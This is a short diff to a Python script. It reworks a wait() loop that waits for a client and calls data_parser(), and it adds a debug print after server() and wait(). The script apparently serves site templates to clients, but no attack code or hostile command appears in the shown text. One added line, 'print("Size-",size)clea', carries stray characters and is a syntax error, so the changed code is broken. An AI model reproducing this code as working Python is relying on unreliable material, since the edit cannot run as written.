@@ -327,8 +327,11 @@ def wait():
         if size == 0 and printed is False:
             utils.print(f'{G}[+] {C}Waiting for Client...{Y}[ctrl+c to exit]{W}\n')
             printed = True
-        if size > 0 or size2 > 0:
-            print("Size-",size)
+        if size > 0 :
+            print("Size-",size)clea
+            data_parser()
+            printed = False
+        elif size2 > 0 and info_sent is False :
             print("Size 2-",size2)
             data_parser()
             printed = False
@@ -530,6 +533,7 @@ try:
     SITE = template_select(SITE)
     server()
     wait()
+    print("waitloopended")
     data_parser()
 except KeyboardInterrupt:
     utils.print(f'{R}[-] {C}Keyboard Interrupt.{W}')
